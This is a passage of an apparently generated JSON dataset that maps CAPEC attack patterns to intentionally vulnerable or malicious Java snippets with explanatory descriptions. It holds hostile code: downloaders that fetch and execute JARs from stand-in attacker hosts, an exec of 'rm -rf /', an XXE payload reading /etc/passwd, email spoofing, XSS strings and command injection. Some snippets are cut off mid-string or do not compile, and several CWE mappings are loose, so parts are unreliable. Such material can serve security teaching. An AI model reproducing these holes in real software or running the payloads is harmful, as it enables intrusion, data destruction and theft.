        "code_snippet": "public class AccessControlSystem {\n    private static final String ADMIN_ROLE = \"admin\";\n    private static final String USER_ROLE = \"user\";\n    private Map<String, String> users = new HashMap<>();\n\n    public AccessControlSystem() {\n        users.put(\"admin\", ADMIN_ROLE);\n        users.put(\"user\", USER_ROLE);\n    }\n\n    public boolean hasAccess(String username, String resource) {\n        String userRole = users.get(username);\n        if (userRole == null) {\n            return false;\n        }\n        // Incorrect permission assignment for critical resource (CWE-732)\n        if (resource.equals(\"criticalResource\") && userRole.equals(USER_ROLE)) {\n            return true; // should return false\n        }\n        // Insufficient granularity of access control (CWE-1220)\n        if (resource.startsWith(\"sensitive\") && userRole.equals(ADMIN_ROLE)) {\n            return true;\n        }\n        return false;\n    }\n\n    public static void main(String[] args) {\n        AccessControlSystem accessControlSystem = new AccessControlSystem();\n        System.out.println(accessControlSystem.hasAccess(\"user\", \"criticalResource\")); // should print false, but prints true\n        System.out.println(accessControlSystem.hasAccess(\"admin\", \"sensitiveData\")); // should print true\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable access control system that allows unauthorized access to critical resources due to incorrect permission assignment (CWE-732) and insufficient granularity of access control (CWE-1220). The hasAccess method checks if a user has access to a resource based on their role, but it incorrectly grants access to the critical resource to users with the USER_ROLE and allows admins to access all sensitive resources without proper checks."
    },
    {
        "capec_id": "181",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.io.PrintWriter;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.MultipartConfig;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.Part;\n\n@WebServlet(name = \"vulnerableServlet\", urlPatterns = {\"/vulnerableServlet\"})\n@MultipartConfig(fileSizeThreshold = 1024 * 1024, maxFileSize = 1024 * 1024 * 5, maxRequestSize = 1024 * 1024 * 5 * 5)\npublic class VulnerableServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        String filePath = \"\";\n        for (Part part : request.getParts()) {\n            filePath = getServletContext().getRealPath(\"\") + File.separator + part.getSubmittedFileName();\n            part.write(filePath);\n        }\n        response.setContentType(\"text/html\");\n        PrintWriter out = response.getWriter();\n        out.println(\"<html><body>\");\n        out.println(\"<object data=\"data:application/x-shockwave-flash\" type=\"application/x-shockwave-flash\"><param name=\"movie\" value=\"\" + filePath + \"\"><param name=\"allowScriptAccess\" value=\"always\"><param name=\"allowFullScreen\" value=\"true\"></object>\");\n        out.println(\"</body></html>\");\n    }\n}\n",
        "description": "This Java code snippet demonstrates a clickjacking vulnerability by allowing an attacker to upload a malicious Flash file, which can then be used to intercept user actions. The code uses a servlet to handle file uploads and generates an HTML page with an embedded Flash object that points to the uploaded file. The Flash file can then be used to create a transparent overlay, catching user actions and interpreting them to perform malicious actions. This code embodies CWEs 434 (Unrestricted Upload of File with Dangerous Type), 1021 (Improper Restriction of Rendered UI Layers or Frames), and 79 (Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting'))."
    },
    {
        "capec_id": "182",
        "code_snippet": "import flash.display.Loader;\nimport flash.display.LoaderInfo;\nimport flash.net.URLRequest;\n\npublic class VulnerableFlashApp {\n    public function VulnerableFlashApp() {\n        var loader:Loader = new Loader();\n        var request:URLRequest = new URLRequest(\"https://attacker-controlled-domain.com/malicious_swf\" + getParameter());\n        loader.load(request);\n    }\n\n    private function getParameter():String {\n        return \"?param=\" + ExternalInterface.call(\"unescape\", \"%25%32%30%25%32%30%25%32%30\") + \"&crossdomain=true\";\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable Flash application that loads a malicious SWF file from an attacker-controlled domain. The getParameter() function retrieves a parameter from the URL, which is not validated, allowing an attacker to inject malicious input (CWE-20). The ExternalInterface.call() function is used to execute a JavaScript function, which can be exploited to bypass security restrictions (CWE-506). The cross-domain policy is permissive, allowing the malicious SWF file to be loaded from an untrusted domain (CWE-942). The loader.load() function does not validate the input, leading to the execution of malicious code (CWE-184, CWE-697)."
    },
    {
        "capec_id": "183",
        "code_snippet": "import java.io.IOException;\nimport javax.mail.MessagingException;\nimport javax.mail.Session;\nimport javax.mail.Store;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class MailServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        String mailbox = req.getParameter(\"mailbox\");\n        String command = req.getParameter(\"command\");\n\n        try {\n            Session session = Session.getInstance(System.getProperties(), null);\n            Store store = session.getStore(\"imap\");\n            store.connect(\"mail.example.com\", mailbox, \"password\");\n\n            // Vulnerable code: command injection\n            Process p = Runtime.getRuntime().exec(\"/usr/bin/imap-cli -a \" + command + \" -m \" + mailbox);\n            p.waitFor();\n\n            resp.setStatus(200);\n        } catch (MessagingException e) {\n            // CWE-209: Generation of Error Message Containing Sensitive Information\n            resp.sendError(500, \"Error accessing mailbox: \" + e.getMessage());\n        } catch (IOException e) {\n            // CWE-209: Generation of Error Message Containing Sensitive Information\n            resp.sendError(500, \"Error executing command: \" + e.getMessage());\n        } catch (InterruptedException e) {\n            // CWE-209: Generation of Error Message Containing Sensitive Information\n            resp.sendError(500, \"Error waiting for command to complete: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable web-mail server that is susceptible to IMAP/SMTP command injection attacks. The servlet takes two parameters: 'mailbox' and 'command'. The 'command' parameter is not properly sanitized, allowing an attacker to inject malicious IMAP commands that are executed on the back-end mail server. The code also includes CWE-209 violations by including sensitive information in error messages."
    },
    {
        "capec_id": "184",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.net.URL;\nimport java.net.URLConnection;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\\",
        "description": "This Java code snippet demonstrates the CAPEC of undermining the integrity of software code by downloading and executing malicious code without integrity checks, embedding malicious code, exposing sensitive system information, and injecting errors to degrade hardware redundancy. The code downloads a JAR file from a remote location and executes it without verifying its origin and integrity, which can lead to the execution of malicious code. The code also contains embedded malicious code that can delete files, exposes sensitive system information, and injects errors to degrade hardware redundancy."
    },
    {
        "capec_id": "185",
        "code_snippet": "import java.net.URL;\nimport java.net.URLConnection;\nimport java.io.InputStream;\nimport java.io.ByteArrayOutputStream;\n\npublic class MaliciousDownloader {\n    public static void main(String[] args) throws Exception {\n        URL url = new URL(\"http://attacker.com/malicious_code.jar\");\n        URLConnection conn = url.openConnection();\n        InputStream in = conn.getInputStream();\n        ByteArrayOutputStream out = new ByteArrayOutputStream();\n        byte[] buffer = new byte[1024];\n        int bytesRead;\n        while ((bytesRead = in.read(buffer)) != -1) {\n            out.write(buffer, 0, bytesRead);\n        }\n        byte[] maliciousCode = out.toByteArray();\n        ClassLoader loader = new java.net.URLClassLoader(new java.net.URL[] { new java.net.URL(\"jar\", \"\", \"!\" + url.toExternalForm()) });\n        Class<?> maliciousClass = loader.loadClass(\"MaliciousCode\");\n        maliciousClass.getMethod(\"main\", new Class<?>[] { String[].class }).invoke(null, new Object[] { args });\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of downloading and executing malicious code from an untrusted source without integrity checks, violating CWE-494. The code downloads a JAR file from a remote location, loads the malicious class, and invokes its main method, potentially leading to the execution of embedded malicious code (CWE-506), replicating malicious code (CWE-509), or Trojan Horse behavior (CWE-507). Additionally, the code may expose sensitive system information to an unauthorized control sphere (CWE-497) if the malicious code is designed to do so."
    },
    {
        "capec_id": "186",
        "code_snippet": "import java.net.URL;\nimport java.net.URLConnection;\nimport java.io.File;\nimport java.io.FileOutputStream;\nimport java.io.InputStream;\n\npublic class MaliciousUpdate {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"http://adversary.com/malicious_update.jar\");\n            URLConnection conn = url.openConnection();\n            InputStream in = conn.getInputStream();\n            File file = new File(\"update.jar\");\n            FileOutputStream out = new FileOutputStream(file);\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                out.write(buffer, 0, bytesRead);\n            }\n            out.close();\n            in.close();\n            Runtime.getRuntime().exec(\"java -jar update.jar\");\n        } catch (Exception e) {\n            System.out.println(\"Error downloading update: \" + e.getMessage());\n        }\n    }\n}\n",
        "description": "This Java code snippet downloads a JAR file from a remote location without verifying its integrity or origin, and then executes it using the Runtime.getRuntime().exec() method. This embodies the main idea of the CAPEC, which involves an adversary using deceptive methods to cause a user or automated process to download and install dangerous code believed to be a valid update. The related CWEs are CWE-494 (Download of Code Without Integrity Check), CWE-506 (Embedded Malicious Code), CWE-509 (Replicating Malicious Code), CWE-507 (Trojan Horse), and CWE-1277 (Firmware Not Updateable)."
    },
    {
        "capec_id": "187",
        "code_snippet": "public class UpdateManager {\n    public void downloadAndExecuteUpdate(String url) {\n        try {\n            URL updateUrl = new URL(url);\n            HttpURLConnection connection = (HttpURLConnection) updateUrl.openConnection();\n            connection.setRequestMethod(\"GET\");\n            int responseCode = connection.getResponseCode();\n            if (responseCode == 200) {\n                InputStream inputStream = connection.getInputStream();\n                byte[] updateBytes = new byte[inputStream.available()];\n                inputStream.read(updateBytes);\n                String updateCode = new String(updateBytes);\n                // Execute the downloaded code without integrity check\n                Runtime.getRuntime().exec(updateCode);\n            }\n        } catch (Exception e) {\n            System.out.println(\"Error downloading update: \" + e.getMessage());\n        }\n    }\n\n    public static void main(String[] args) {\n        UpdateManager updateManager = new UpdateManager();\n        // Use a hardcoded URL that can be tampered with by an attacker\n        String updateUrl = \"http://example.com/update\";\n        updateManager.downloadAndExecuteUpdate(updateUrl);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable update mechanism that downloads and executes code from a remote location without proper authentication and integrity checks. The 'downloadAndExecuteUpdate' method uses a hardcoded URL that can be tampered with by an attacker, and the downloaded code is executed without verifying its origin and integrity. This code is vulnerable to CWE-494 (Download of Code Without Integrity Check), CWE-294 (Authentication Bypass by Capture-replay), CWE-602 (Client-Side Enforcement of Server-Side Security), CWE-506 (Embedded Malicious Code), and CWE-807 (Reliance on Untrusted Inputs in a Security Decision)."
    },
    {
        "capec_id": "188",
        "code_snippet": "public class ReverseEngineeredCrypto { \n\\tprivate static final String SECRET_KEY = \\",
        "description": "This Java code snippet demonstrates the concept of reverse engineering by using a broken or risky cryptographic algorithm (CWE-327) to encrypt sensitive data. An attacker could potentially use IC imaging techniques (CWE-1278) to reverse engineer the integrated circuit and recover the secret key. Additionally, the code may expose sensitive system information (CWE-497) and include undocumented features or 'chicken bits' (CWE-1242) that can be exploited. Furthermore, the processor optimization may remove or modify security-critical code (CWE-1037), making the encryption mechanism vulnerable to attacks."
    },
    {
        "capec_id": "189",
        "code_snippet": "public class BlackBoxAnalyzer {\n    public static void main(String[] args) {\n        try {\n            // CWE-203: Observable Discrepancy\n            String input = \"test\";\n            if (input.equals(\"admin\")) {\n                System.out.println(\"Access granted\");\n            } else {\n                System.out.println(\"Access denied\");\n            }\n\n            // CWE-1255: Comparison Logic is Vulnerable to Power Side-Channel Attacks\n            byte[] token = new byte[16];\n            for (int i = 0; i < 16; i++) {\n                token[i] = (byte) (Math.random() * 256);\n            }\n            boolean isValid = false;\n            for (int i = 0; i < 16; i++) {\n                if (token[i] == 0x12) {\n                    isValid = true;\n                    break;\n                }\n            }\n            if (isValid) {\n                System.out.println(\"Token is valid\");\n            } else {\n                System.out.println(\"Token is invalid\");\n            }\n\n            // CWE-1300: Improper Protection of Physical Side Channels\n            System.out.println(\"Power consumption: \" + getPowerConsumption());\n\n            // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n            System.out.println(\"System information: \" + System.getProperty(\"os.name\"));\n\n            // CWE-506: Embedded Malicious Code\n            Runtime.getRuntime().exec(\"rm -rf /\");\n        } catch (Exception e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n\n    private static int getPowerConsumption() {\n        // Simulate power consumption measurement\n        return (int) (Math.random() * 100);\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of black box analysis, where an adversary interacts with the software indirectly to gather information about its internal workings. The code includes examples of observable discrepancy, power side-channel attacks, improper protection of physical side channels, exposure of sensitive system information, and embedded malicious code."
    },
    {
        "capec_id": "190",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.nio.file.Path;\nimport java.util.zip.ZipEntry;\nimport java.util.zip.ZipInputStream;\n\npublic class ReverseEngineer {\n    public static void main(String[] args) throws IOException {\n        // CWE-912: Hidden Functionality\n        String hiddenFunction = \"hiddenFunction\";\n        if (args.length > 0 && args[0].equals(hiddenFunction)) {\n            // CWE-497: Exposure of Sensitive System Information\n            System.out.println(\"System Information: \" + System.getProperty(\"os.name\"));\n            // CWE-1323: Improper Management of Sensitive Trace Data\n            String traceData = \"sensitive_trace_data\";\n            Files.write(Paths.get(\"trace.log\"), traceData.getBytes());\n        }\n\n        // CWE-494: Download of Code Without Integrity Check\n        String url = \"https://example.com/malicious_code.zip\";\n        downloadAndExecuteCode(url);\n    }\n\n    public static void downloadAndExecuteCode(String url) throws IOException {\n        // CWE-506: Embedded Malicious Code\n        File file = new File(\"malicious_code.zip\");\n        // download code from URL\n        // execute code without integrity check\n        ZipInputStream zis = new ZipInputStream(Files.newInputStream(file.toPath()));\n        ZipEntry entry;\n        while ((entry = zis.getNextEntry()) != null) {\n            // execute code\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of reverse code engineering by analyzing a binary file or executable to discover its structure, function, and possibly source code. It incorporates several CWEs, including hidden functionality, exposure of sensitive system information, improper management of sensitive trace data, download of code without integrity check, and embedded malicious code."
    },
    {
        "capec_id": "191",
        "code_snippet": "public class HardcodedCredentials {\n    private static final String DATABASE_USERNAME = \"admin\";\n    private static final String DATABASE_PASSWORD = \"password123\";\n    private static final String ENCRYPTION_KEY = \"my_secret_key\";\n\n    public static void main(String[] args) {\n        String connectionString = \"jdbc:mysql://localhost:3306/mydb?user=\" + DATABASE_USERNAME + \"&password=\" + DATABASE_PASSWORD;\n        System.out.println(connectionString);\n\n        String encryptedData = encryptData(\"my_secret_data\", ENCRYPTION_KEY);\n        System.out.println(encryptedData);\n    }\n\n    public static String encryptData(String data, String key) {\n        // encryption logic using the hard-coded key\n        return data + \"_encrypted\";\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of discovering sensitive constants within the compiled code of an executable. It includes hard-coded credentials (CWE-798) for database authentication, a hard-coded encryption key (CWE-547), and cleartext storage of sensitive information in the executable (CWE-318). The code also lacks proper isolation of symbolic constant definitions (CWE-1107) and does not restrict access to dynamically-managed code resources (CWE-913)."
    },
    {
        "capec_id": "192",
        "code_snippet": "import javax.crypto.Cipher;\nimport javax.crypto.KeyGenerator;\nimport javax.crypto.SecretKey;\nimport java.security.SecureRandom;\nimport java.util.Base64;\n\npublic class InsecureProtocolAnalyzer {\n    public static void main(String[] args) throws Exception {\n        // CWE-326: Inadequate Encryption Strength\n        KeyGenerator keyGen = KeyGenerator.getInstance(\"AES\");\n        keyGen.init(56); // Using a weak key size of 56 bits\n        SecretKey secretKey = keyGen.generateKey();\n\n        // CWE-319: Cleartext Transmission of Sensitive Information\n        String sensitiveData = \"confidentialInformation\";\n        System.out.println(\"Sending sensitive data in cleartext: \" + sensitiveData);\n\n        // CWE-757: Selection of Less-Secure Algorithm During Negotiation\n        String[] algorithms = {\"AES\", \"DES\", \"RC2\"};\n        String chosenAlgorithm = algorithms[2]; // Choosing a weaker algorithm (RC2)\n        Cipher cipher = Cipher.getInstance(chosenAlgorithm);\n        cipher.init(Cipher.ENCRYPT_MODE, secretKey);\n\n        // CWE-188: Reliance on Data/Memory Layout\n        byte[] data = sensitiveData.getBytes();\n        byte[] encryptedData = cipher.doFinal(data);\n        System.out.println(\"Encrypted data: \" + Base64.getEncoder().encodeToString(encryptedData));\n\n        // CWE-1292: Incorrect Conversion of Security Identifiers\n        int securityIdentifier = 0x1234;\n        String convertedIdentifier = String.valueOf(securityIdentifier);\n        System.out.println(\"Converted security identifier: \" + convertedIdentifier);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable protocol analyzer that embodies the main idea of the CAPEC. It includes CWEs 326, 319, 757, 188, and 1292. The code uses a weak encryption key, transmits sensitive data in cleartext, selects a weaker algorithm during negotiation, makes invalid assumptions about data/memory layout, and incorrectly converts security identifiers."
    },
    {
        "capec_id": "193",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.net.URL;\nimport java.net.URLClassLoader;\n\npublic class VulnerableCode {\n    public static void main(String[] args) throws IOException {\n        String userInput = \"http://example.com/malicious_code.php\";\n        URL url = new URL(userInput);\n        URLClassLoader loader = new URLClassLoader(new URL[] { url });\n        Class<?> clazz = loader.loadClass(\"MaliciousCode\");\n        clazz.newInstance();\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC pattern of remote code execution through insecure file inclusion. The code loads a PHP file from a user-controlled input URL, which can be manipulated by an attacker to execute arbitrary code. This is similar to CWE-98 (Improper Control of Filename for Include/Require Statement in PHP Program) and CWE-646 (Reliance on File Name or Extension of Externally-Supplied File). Additionally, the code's reliance on user input without proper sanitization and validation makes it vulnerable to CWE-80 (Improper Neutralization of Script-Related HTML Tags in a Web Page) and CWE-433 (Unparsed Raw Web Content Delivery)."
    },
    {
        "capec_id": "194",
        "code_snippet": "import java.net.Socket;\nimport java.io.DataOutputStream;\nimport java.io.DataInputStream;\n\npublic class EmailSender {\n    public static void main(String[] args) throws Exception {\n        Socket socket = new Socket(\"mail.example.com\", 25);\n        DataOutputStream out = new DataOutputStream(socket.getOutputStream());\n        DataInputStream in = new DataInputStream(socket.getInputStream());\n\n        out.writeBytes(\"HELO sender\r\n\");\n        out.writeBytes(\"MAIL FROM: <attacker@example.com>\r\n\");\n        out.writeBytes(\"RCPT TO: <victim@example.com>\r\n\");\n        out.writeBytes(\"DATA\r\n\");\n        out.writeBytes(\"From: <spoofed@example.com>\\r\\n\");\n        out.writeBytes(\"To: <victim@example.com>\\r\\n\");\n        out.writeBytes(\"Subject: Spoofed Email\\r\\n\");\n        out.writeBytes(\"This is a spoofed email.\\r\\n\");\n        out.writeBytes(\".\r\n\");\n        out.writeBytes(\"QUIT\r\n\");\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of improper authentication, where an adversary sends an email with a spoofed 'From' field to impersonate another user. The code establishes a socket connection to a mail server and sends a spoofed email using the SMTP protocol. The CWEs related to this code snippet include CWE-287 (Improper Authentication), CWE-940 (Improper Verification of Source of a Communication Channel), CWE-290 (Authentication Bypass by Spoofing), CWE-924 (Improper Enforcement of Message Integrity During Transmission in a Communication Channel), and CWE-300 (Channel Accessible by Non-Endpoint)."
    },
    {
        "capec_id": "195",
        "code_snippet": "import java.net.URL;\nimport java.net.URLConnection;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class PrincipalSpoof {\n    public static void main(String[] args) throws Exception {\n        URL url = new URL(\"http://example.com/login\");\n        URLConnection conn = url.openConnection();\n        conn.setRequestProperty(\"From\", \"admin@example.com\"); // Spoofing the 'From' header\n        conn.setRequestProperty(\"User-Agent\", \"Mozilla/5.0\");\n        BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n        String inputLine;\n        while ((inputLine = in.readLine()) != null) {\n            System.out.println(inputLine);\n        }\n        in.close();\n    }\n}\n",
        "description": "This Java code snippet demonstrates a Principal Spoof attack by spoofing the 'From' header in an HTTP request to impersonate an administrator. The code does not verify the identity of the actor, making it vulnerable to CWE-322 Key Exchange without Entity Authentication. Additionally, the authentication mechanism is weak, making it vulnerable to CWE-1390 Weak Authentication. The code also does not correctly specify the intended destination for the request, making it vulnerable to CWE-941 Incorrectly Specified Destination in a Communication Channel. This can lead to CWE-290 Authentication Bypass by Spoofing and CWE-301 Reflection Attack in an Authentication Protocol."
    },
    {
        "capec_id": "196",
        "code_snippet": "public class SessionManager {\n    private Map<String, String> sessions = new HashMap<>();\n    \n    public void createSession(String username, String password) {\n        String sessionId = generateSessionId();\n        sessions.put(sessionId, username);\n        // No expiration or invalidation of existing session IDs\n        // CWE-613: Insufficient Session Expiration\n        // CWE-664: Improper Control of a Resource Through its Lifetime\n    }\n    \n    public boolean isValidSession(String sessionId) {\n        return sessions.containsKey(sessionId);\n    }\n    \n    public String generateSessionId() {\n        // CWE-1391: Use of Weak Credentials\n        // Using a weak random number generator\n        return \"SESSION-\" + new Random().nextInt(1000);\n    }\n    \n    public void handleRequest(String sessionId, String username, String password) {\n        if (isValidSession(sessionId)) {\n            // CWE-523: Unprotected Transport of Credentials\n            // Credentials are sent in plain text\n            System.out.println(\"Authenticated as \" + username);\n        } else {\n            System.out.println(\"Invalid session\");\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of forging session credentials. The SessionManager class creates sessions without invalidating existing session IDs, allowing an attacker to forge a valid session credential. The generateSessionId method uses a weak random number generator, making it easier for an attacker to guess or calculate a valid session ID. The handleRequest method sends credentials in plain text, making it vulnerable to eavesdropping. An attacker can create a false but functional session credential to gain unauthorized access to the service."
    },
    {
        "capec_id": "197",
        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport org.w3c.dom.Document;\nimport org.w3c.dom.Element;\n\npublic class XMLEntityExpansion {\n    public static void main(String[] args) throws Exception {\n        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n        DocumentBuilder builder = factory.newDocumentBuilder();\n        String xml = \\",
        "description": "This Java code snippet demonstrates the concept of XML Entity Expansion, which is a type of exponential data expansion. It defines a recursive XML entity that expands to a large amount of data, causing excessive memory allocation and CPU usage. This code is vulnerable to CWE-776: Improper Restriction of Recursive Entity References in DTDs ('XML Entity Expansion')."
    },
    {
        "capec_id": "198",
        "code_snippet": "public class ErrorPageGenerator {\n    public static String generateErrorPage(String userInput) {\n        String errorMessage = \"<html><body>Error occurred: \" + userInput + \"</body></html>\";\n        return errorMessage;\n    }\n\n    public static void main(String[] args) {\n        String userInput = \"<script>alert('XSS')</script>\";\n        String errorPage = generateErrorPage(userInput);\n        System.out.println(errorPage);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable error page generator that is susceptible to Cross-Site Scripting (XSS) attacks. The generateErrorPage method takes user input and embeds it directly into an HTML error page without proper neutralization of script tags, allowing an attacker to inject malicious scripts. In the main method, a sample user input containing a script tag is used to demonstrate the vulnerability."
    },
    {
        "capec_id": "199",
        "code_snippet": "public class VulnerableFilter {\n    public String filterInput(String input) {\n        String[] forbiddenKeywords = {\"script\", \"iframe\"};\n        for (String keyword : forbiddenKeywords) {\n            if (input.toLowerCase().contains(keyword)) {\n                return \"Filtered\";\n            }\n        }\n        return input;\n    }\n\n    public static void main(String[] args) {\n        VulnerableFilter filter = new VulnerableFilter();\n        String userInput = \"<ScRiPt>alert('XSS')</ScRiPt>\";\n        String filteredInput = filter.filterInput(userInput);\n        System.out.println(filteredInput);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable filter that can be bypassed using alternate forms of keywords or commands. The filter checks for forbidden keywords in a case-insensitive manner, but it does not convert the input to a consistent case before comparison. An attacker can bypass the filter by using an alternate case structure, such as 'ScRiPt' instead of 'script'. This code is vulnerable to CWE-87, CWE-80, CWE-1289, CWE-692, and CWE-1336."
    },
    {
        "capec_id": "200",
        "code_snippet": "public class VulnerableInputFilter {\n    public void processUserInput(String userInput) {\n        // CWE-20: Improper Input Validation\n        // CWE-184: Incomplete List of Disallowed Inputs\n        if (!userInput.contains(\"<script\") && !userInput.contains(\"<iframe\")) {\n            // CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\n            String htmlOutput = \"<div>\" + userInput + \"</div>\";\n            // CWE-182: Collapse of Data into Unsafe Value\n            String unsafeValue = htmlOutput.replace(\"&\", \"&amp;\");\n            // CWE-707: Improper Neutralization\n            System.out.println(unsafeValue);\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable input filter that fails to properly validate and neutralize user input. It only checks for a limited set of disallowed inputs and does not properly encode special characters, making it vulnerable to injection attacks."
    },
    {
        "capec_id": "201",
        "code_snippet": "import java.io.ByteArrayInputStream; import java.io.ObjectInputStream; import javax.xml.parsers.DocumentBuilderFactory; import org.w3c.dom.Document; import org.xml.sax.InputSource; public class VulnerableCode { public static void main(String[] args) throws Exception { String xml = \"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \\\"file:///etc/passwd\\\">]><root><foo>&xxe;</foo></root>\"; DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance(); factory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", false); Document doc = factory.newDocumentBuilder().parse(new InputSource(new ByteArrayInputStream(xml.getBytes()))); System.out.println(doc.getDocumentElement().getTextContent()); } }",
        "description": "This Java code snippet demonstrates the CAPEC of creating a serialized data file with an external data reference. The code uses XML parsing to deserialize the input XML string, which contains an external entity reference to the /etc/passwd file. The CWEs embodied in this code snippet include CWE-611 (Improper Restriction of XML External Entity Reference), CWE-502 (Deserialization of Untrusted Data), and CWE-829 (Inclusion of Functionality from Untrusted Control Sphere). The code does not validate the XML document with external references, allowing an adversary to open arbitrary files or connections, potentially leading to unauthorized access to system information."
    },
    {
        "capec_id": "202",
        "code_snippet": "public class MaliciousClient {\n    public static void main(String[] args) {\n        // CWE-506: Embedded Malicious Code\n        String maliciousCode = \"System.out.println('Malicious code executed');\";\n        try {\n            Runtime.getRuntime().exec(maliciousCode);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n        // CWE-603: Use of Client-Side Authentication\n        String username = \"admin\";\n        String password = \"password\";\n        if (authenticate(username, password)) {\n            // Bypass server-side authentication\n            System.out.println(\"Authenticated successfully\");\n            // CWE-1229: Creation of Emergent Resource\n            createEmergentResource();\n        } else {\n            System.out.println(\"Authentication failed\");\n        }\n    }\n\n    // CWE-507: Trojan Horse\n    public static boolean authenticate(String username, String password) {\n        // Hidden authentication logic\n        return true;\n    }\n\n    // CWE-602: Client-Side Enforcement of Server-Side Security\n    public static void createEmergentResource() {\n        // Create a resource that violates the intended policy\n        System.out.println(\"Emergent resource created\");\n    }\n}",
        "description": "A malicious client application that violates assumptions made by the target service, bypassing server-side authentication and creating an emergent resource that violates the intended policy."
    },
    {
        "capec_id": "203",
        "code_snippet": "import java.util.Properties;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\n\npublic class RegistryManipulator {\n    public static void main(String[] args) {\n        try {\n            // CWE-15: External Control of System or Configuration Setting\n            Properties props = new Properties();\n            props.load(new FileInputStream(\"config.properties\"));\n            props.setProperty(\"service.enabled\", \"true\");\n            props.store(new FileOutputStream(\"config.properties\"), null);\n\n            // CWE-314: Cleartext Storage in the Registry\n            Runtime.getRuntime().exec(\"reg add HKCU\\\\Software\\\\MyApp /v MySetting /t REG_SZ /d MyValue /f\");\n\n            // CWE-1231: Improper Prevention of Lock Bit Modification\n            // Assume 'lockBit' is a variable controlling access to a critical resource\n            boolean lockBit = true;\n            // ...\n            lockBit = false; // An adversary can modify the lock bit\n\n            // CWE-1422: Exposure of Sensitive Information caused by Incorrect Data Forwarding during Transient Execution\n            // Assume 'sensitiveData' is a variable holding sensitive information\n            String sensitiveData = \"mySecret\";\n            // ... transient execution or prediction may expose sensitiveData\n\n            // CWE-649: Reliance on Obfuscation or Encryption of Security-Relevant Inputs without Integrity Checking\n            String encryptedInput = \"encryptedData\";\n            // ... no integrity check is performed on encryptedInput\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of exploiting weaknesses in authorization to modify content within a registry. It includes examples of CWE-15, CWE-314, CWE-1231, CWE-1422, and CWE-649, showcasing how an adversary can manipulate registry information, store sensitive data in cleartext, modify lock bits, expose sensitive information, and rely on obfuscation or encryption without integrity checks."
    },
    {
        "capec_id": "204",
        "code_snippet": "public class SensitiveCache { \n public static void main(String[] args) { \n String sensitiveData = \"secretKey\"; \n // CWE-524: Cache containing sensitive information \n Cache cache = new Cache(); \n cache.put(\"key\", sensitiveData); \n // CWE-311: Missing encryption of sensitive data \n String unencryptedData = sensitiveData; \n System.out.println(\"Unencrypted data: \" + unencryptedData); \n // CWE-525: Insecure web browser cache policy \n HttpServletResponse response = new HttpServletResponse(); \n response.setHeader(\"Cache-Control\", \"public, max-age=31536000\"); \n } \n} \n\n// CWE-1239: Improper zeroization of hardware register (simulated) \npublic class InsecureHardwareRegister { \n public static void main(String[] args) { \n HardwareRegister register = new HardwareRegister(); \n register.setValue(\"sensitiveValue\"); \n // Not clearing the register \n } \n} \n\n// CWE-1258: Exposure of sensitive system information due to uncleared debug information (simulated) \npublic class InsecureDebugMode { \n public static void main(String[] args) { \n DebugMode debugMode = new DebugMode(); \n debugMode.setDebugEnabled(true); \n // Not clearing sensitive values in debug mode \n } \n}",
        "description": "This Java code snippet demonstrates the CAPEC of examining a target application's cache for sensitive information. It includes CWE-524 by using a cache that contains sensitive information, CWE-311 by not encrypting sensitive data, CWE-525 by using an insecure web browser cache policy, CWE-1239 by not properly clearing sensitive information from a hardware register, and CWE-1258 by not clearing sensitive system information in debug mode."
    },
    {
        "capec_id": "205",
